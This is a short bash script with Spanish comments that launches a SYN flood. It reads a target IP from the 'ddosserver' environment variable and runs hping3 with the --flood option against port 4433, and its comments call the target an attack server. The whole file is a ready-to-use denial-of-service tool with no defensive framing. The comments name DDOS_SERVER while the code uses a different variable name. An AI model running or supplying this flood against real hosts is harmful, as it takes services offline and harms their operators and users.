#!/bin/bash

# Verifica si la variable de entorno DDOS_SERVER está definida
if [ -z "$ddosserver" ]; then
  echo "La variable de entorno ddosserver no está definida. Ejecuta export ddosserver=¨ip¨"
  exit 1
fi

# Utiliza la variable de entorno DDOS_SERVER como la dirección del servidor de ataque
sudo hping3 -c 200 -d 200000000 -S "$ddosserver" -p 4433 --flood
